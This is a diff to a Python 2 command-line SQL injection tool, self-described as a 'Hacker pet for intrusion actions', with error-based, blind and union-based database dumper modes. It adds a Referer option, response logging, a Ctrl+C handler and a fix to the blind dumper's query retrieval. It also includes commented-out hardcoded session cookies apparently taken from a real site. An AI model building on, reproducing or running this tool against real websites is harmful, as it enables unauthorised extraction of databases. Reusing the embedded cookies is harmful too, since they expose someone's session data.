@@ -6,6 +6,7 @@ p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...'
 p.add_argument( '-u' , '--url'     , required = True          , help = 'url of site (can contain >>value<<)' )
 p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send POST data use this var'      )
 p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'     )
+p.add_argument( '-r' , '--referer' , metavar = 'REFERER'      , help = 'Referer header in request'           )
 p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
 p.add_argument( '-v' , '--verbose' , action = 'append_const'  , const = 1, default = []  , help = 'how much verbose should be output' )
 p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
@@ -19,13 +20,13 @@ g.add_argument( '--sql', metavar = 'SQL_QUERY', help = 'this query will be retri
 
 sp = p.add_subparsers( help = 'Commands for piglet:' )
 pp = sp.add_parser( 'error', help = 'error-based SQL dumper' )
-pp.set_defaults( func = lambda : DError( args ).run() )
+pp.set_defaults( func = lambda : DError( args ).trun() )
 
 pp = sp.add_parser( 'blind', help = 'blind-based SQL dumper' )
-pp.set_defaults( func = lambda : DBlind( args ).run() )
+pp.set_defaults( func = lambda : DBlind( args ).trun() )
 
 pp = sp.add_parser( 'union', help = 'union-based SQL dumper' )
-pp.set_defaults( func = lambda : DError( args ).run() )
+pp.set_defaults( func = lambda : DError( args ).trun() )
 
 args = p.parse_args()
 
@@ -51,13 +52,17 @@ class API( object ):
             time.sleep( tsleep )
             self.log( 2, "[D] request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )
 
+            heads = {}
             ## TODO: HARDCODED Cookie !!!!
-            heads = { 'Accept'          : '''text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8''',
-                      'Accept-Language' : '''en-us,en;q=0.5''',
-                      'Accept-Encoding' : '''gzip, deflate''',
-                      'Accept-Charset'  : '''ISO-8859-1,utf-8;q=0.7,*;q=0.7''',
-                      'Connection'      : '''keep-alive''',
-                      'Cookie'          : '''parser=fmbiibgqagu1mue7joljpn68e4; __utma=249254534.28478131.1312521671.1312540729.1312545197.4; __utmz=249254534.1312545197.4.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=chaos%20constructions%202011; __utmc=249254534; __utmb=249254534.4.10.1312545197''' }
+            #heads = { 'Accept'          : '''text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8''',
+            #          'Accept-Language' : '''en-us,en;q=0.5''',
+            #          'Accept-Encoding' : '''gzip, deflate''',
+            #          'Accept-Charset'  : '''ISO-8859-1,utf-8;q=0.7,*;q=0.7''',
+            #          'Connection'      : '''keep-alive''',
+            #          'Cookie'          : '''__utma=249254534.28478131.1312521671.1312561170.1312603242.8; __utmz=249254534.1312603242.8.9.utmcsr=cc.org.ru|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmc=249254534; parser=pb9knafmlussfl8pjpgi0l5oi4; __utmb=249254534.16.10.1312603242''' }
+            if self.a.referer:
+                heads[ 'Referer' ] = self.a.referer
+
 
             o = urllib2.build_opener( )
             r = urllib2.Request( get, post, heads )
@@ -69,9 +74,11 @@ class API( object ):
                 stream = o.open( r, timeout = 15 )
                 code = stream.getcode()
                 html = stream.read()
+                self.log( 3, '[D] HTML SERVER ANSWER:\n' + html )
             except urllib2.HTTPError, e:
                 code = e.getcode()
                 html = e.read()
+                self.log( 3, '[D] HTML SERVER ANSWER:\n' + html )
             except urllib2.URLError, e:
                 code = None
                 tsleep   *= 2   ## double time to sleep
@@ -115,6 +122,14 @@ class API( object ):
         vs = [ self.a.url, self.a.post, self.a.cookie ]
         vs = map( lambda x: x and r.sub( val, x ), vs )
         print "GET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( vs[ 0 ], vs[ 1 ], vs[ 2 ] )
+
+    def trun( self ):
+        """ call self.run() in try-except block
+        """
+        try:
+            self.run()
+        except KeyboardInterrupt, e:
+            self.err( '[*] CTRL+C: bye-bye' )
 
 
 class SQL( object ):
@@ -237,7 +252,7 @@ class DBlind( API ):
             sql_cnt = sql( g + '_cnt' )
             if sql_cnt is None:
                 self.log( 0, '[i] SQL: %s' % sql( g ) )
-                res = val( sql( g ) )
+                res = self.get( sql( g ) )
                 self.log( 0, '[o] result: %s' % res )
             else:
                 arr = []
